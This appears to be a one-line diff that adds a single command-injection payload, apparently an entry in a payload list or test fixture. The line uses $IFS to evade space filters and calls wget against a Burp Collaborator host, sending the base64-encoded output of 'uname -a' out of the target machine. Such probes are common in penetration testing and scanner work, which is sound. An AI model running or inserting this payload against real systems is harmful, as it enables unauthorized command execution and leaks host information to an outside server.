@@ -1,0 +1,1 @@
+wget$IFS'http://e4j03em2lwlk2dwbeqbj4pgkhbn1bq.burpcollaborator.net/'`uname$IFS-a|base64`
